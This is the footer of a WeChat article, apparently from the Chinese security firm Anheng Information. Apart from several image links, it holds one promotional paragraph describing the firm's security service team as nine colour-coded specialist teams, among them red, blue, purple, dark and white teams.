[![图片](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zILiaxgAuBsouKfcCRqhr31TXicZ64KQ0QUASfZKxRiapYynDxibLfC2p48eR1e8xU4KcPWmJJrcLgwLw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247525289&idx=1&sn=856b2729a5ffc9086f316dca9e707e1a&chksm=9ae12291ad96ab8700099698fd5bb48cba22861dbfd673b8bb25bdf8cb4bb3d8554e075dc7a6&scene=21#wechat_redirect)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Ljib4So7yuWjVsaTygX5CCGxuYZaPeibrpfOOGAjXfTkTp3AIPeXv08iayGTH94Xcmvk4RJxs9NNSc2vzCoCiaXOSQ/640?wx_fmt=jpeg&wx_co=1&wxfrom=5&wx_lazy=1)

  

**关于安恒信息安全服务团队**

**安恒信息安全服务团队由九维安全能力专家构成，其职责分别为：红队持续突破、橙队擅于赋能、黄队致力建设、绿队跟踪改进、青队快速处置、蓝队实时防御，紫队不断优化、暗队专注情报和研究、白队运营管理，以体系化的安全人才及技术为客户赋能。**

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zIFIDZlXFuQeZrcKrV7Zd8Aeg98Fw5jzbGBgUW1hVQXIV3YpLZncEYibgw7MFwWtDU5vwnE2QFVP7A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zL31gt4m6YIRLh7wJeOSwYPOIblCvhN6OgHhV9NMJNH0TBianlpMmRbaKG1ia7iaPsWb4UX4ImgfEJ0A/640?wx_fmt=jpeg&wx_co=1&wxfrom=5&wx_lazy=1)

![](https://mmbiz.qpic.cn/mmbiz_gif/hiaiaLeG6N1zItD3hicyicTUxCsdYyvSZWKOCUgD3ep5Jp4DE8e2S2Y3WnxsKjicicOg3OsGGRc9NPibQ61aRAqNXZQDA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)